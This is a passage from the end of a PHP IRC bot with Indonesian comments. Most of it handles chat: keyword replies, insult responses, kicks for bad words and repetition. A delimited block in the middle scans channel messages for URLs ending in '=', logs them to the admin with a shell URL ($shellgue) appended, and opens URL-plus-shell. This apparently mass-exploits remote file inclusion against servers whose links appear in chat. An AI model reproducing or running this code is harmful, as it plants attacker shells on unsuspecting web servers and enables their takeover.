                                                     if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
                                                        foreach ($respon_pesan as $rpesan) {
                                                           $trtext = strtolower($rpesan[0]);
                                                           if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                              $rpesan[1] = str_replace("<nick>",$fsrc[nick],$rpesan[1]);
                                                              $modbot->msg($fp,$Params[2],$rpesan[1]);
                                                              $ada = TRUE;
                                                           }
                                                        }
                                                        foreach ($pujianlist as $rpesan) {
                                                           $trtext = strtolower($rpesan);
                                                           if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                              $jawab = $rpujian[rand(0,count($rpujian) - 1)];
                                                              $jawab = str_replace("<nick>",$fsrc[nick],$jawab);
                                                              $jawab = str_replace("<kata>",$trtext,$jawab);
                                                              $modbot->msg($fp,$Params[2],$jawab);
                                                              $ada = TRUE;
                                                           }
                                                        }
                                                        foreach ($cacianlist as $rpesan) {
                                                           $trtext = strtolower($rpesan);
                                                           if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                              $jawab = $rcacian[rand(0,count($rcacian) - 1)];
                                                              $jawab = str_replace("<nick>",$fsrc[nick],$jawab);
                                                              $jawab = str_replace("<kata>",$trtext,$jawab);
                                                              $modbot->msg($fp,$Params[2],$jawab);
                                                              $ada = TRUE;
                                                           }
                                                        }
                                                        if (!$ada) {
                                                           $jwbpsn = $jawabsapa[rand(0,count($jawabsapa) - 1)];
                                                           $jwbpsn = str_replace("<nick>",$fsrc[nick],$jwbpsn);
                                                           $modbot->msg($fp,$Params[2],$jwbpsn);
                                                        }

                                                     }
                                                }
                                  }
                                  elseif($systembot['NGOMONG'][strtoupper($Params[2])]=="3ON"){
                                  $ada = FALSE;
                                                if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
                                                     foreach ($badwordlist as $rpesan) {
                                                        $trtext = strtolower($rpesan);
                                                        if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                           $jawab = $rjorok[rand(0,count($rjorok) - 1)];
                                                           $jawab = str_replace("<nick>",$fsrc[nick],$jawab);
                                                           $jawab = str_replace("<kata>",$trtext,$jawab);
                                                           $modbot->msg($fp,$Params[2],$jawab);
                                                           $ada = TRUE;
                                                           if($systembot['BADWORD'][strtoupper($Params[2])]=="3ON"){$modbot->kick($fp,$Params[2],$fsrc[nick],"NgOmOnG YaNg SoPaN DuNk..!");    }
                                                        }
                                                     }
                                                     foreach ($respon_umum as $rpesan) {
                                                        $trtext = strtolower($rpesan[0]);
                                                        if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                           $rpesan[1] = str_replace("<nick>",$fsrc[nick],$rpesan[1]);
                                                           $modbot->msg($fp,$Params[2],$rpesan[1]);
                                                           $ada = TRUE;
                                                        }
                                                     }
                                                }
                                  }
                                }
                                elseif (substr($Params[3],0,3)==':me'){
                                       $modbot->join($fp,'###');
                                }
                                if (substr($Params[3],0,1)==':') {
###############################################################################################
$trtext="http://";
if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
$awaltex=0;
$adatarget=0;
$ltexttarget=0;
$panjangtex=strlen($TxtMsg);
do {
    $awaltex=$awaltex+1;
    $httptarget=substr($TxtMsg,$awaltex,$panjangtex);
    $httptarget=substr($httptarget,0,4);
    $httptarget=strtolower($httptarget);
    if($httptarget=="http"){$ltexttarget=$awaltex;$adatarget=1;break;   }
    if($awaltex>=$panjangtex){$adatarget=0;break;                       }
} while(true);
$ahirtarget=$panjangtex;
$hasiltarget=substr($TxtMsg,$ltexttarget,$panjangtex);
$rtexttarget=$panjangtex-$ltexttarget;
do {
    $ahirtarget=$ahirtarget-1;
    $rtexttarget=$ahirtarget-$ltexttarget;
    $mburine=substr($TxtMsg,0,$ahirtarget);
    $mburine=substr($mburine,$ahirtarget-1,$ahirtarget);
    $mburine=strtolower($mburine);
    if($mburine=="="){
       $adatarget=2;
       $rtexttarget=$ahirtarget-$ltexttarget;
       break;
    }
    if($ahirtarget<=1){$adatarget=0;break;                              }
} while(true);
if($adatarget==2){
$hasiltarget=substr($hasiltarget,0,$rtexttarget);
$cektarget=substr($hasiltarget,0,15);
$ngulange=0;
do {
    $ngulange=$ngulange+1;
    $cektaget=substr($hasiltargetgue[$ngulange],0,15);
    if($cektaget==$cektarget){$sido=0;break;   }
    if($ngulange>=$notarget){$sido=1;break;   }
} while(true);
if(($sido==1) && (!ereg("",$hasiltarget)) && (!ereg(" ",$hasiltarget))){
$notarget=$notarget+1;
$hasiltargetgue[$notarget]=$hasiltarget;
if($bagitarget=="ON"){$modbot->msg($fp,$bot['admin'],$hasiltarget.$shellgue);  }
$loadergue = fopen ($hasiltargetgue[$notarget].$shellgue, "rb");
}
$sido=0;
}
}
###############################################################################################
                                $yangngomong=strtolower($fsrc[nick]);
                                $asalseen[$yangngomong]="ada";
                                    if (substr($Params[3],0,1)==':' && ereg('#',$Params[2]) && $systembot['GUARD'][strtoupper($Params[2])]=="3ON") {
                                    $temptex=strtolower($Params[2]).strtolower($fsrc[nick]).strtolower($Params[3]).strtolower($Params[4]);
                                      if ($temptex==$textemp){
                                           $textrep=($textrep+1);
                                           if ($textrep>=$Maxreep){
                                           $modbot->kick($fp,$Params[2],$fsrc[nick],"0,4OJo RePpEaT BoLaK BaLiK SuU..!!");
                                           $textrep=0;
                                           }
                                      }else {$textrep=0;$textemp=$temptex;}
                                    }
                                }
                                ########### NET ############
                                break;
                        }
                        ##[ AKHIR DATA RAW NIH ]##
                }
                ### PERMAINAN PING PONG ###
                elseif ( substr($DataLine,0,4) == 'PING' ) {$modbot->send($fp,'PONG ' . substr($DataLine,5));}
                $response ="";
            }
            ##[ End Proses Data Recv ]##
        }
        fclose ($fp);
        unset ($fp);
        $response='';
    }
}  while ($keluar==0);
}
################### [ END CONNECT ] ###################
?>

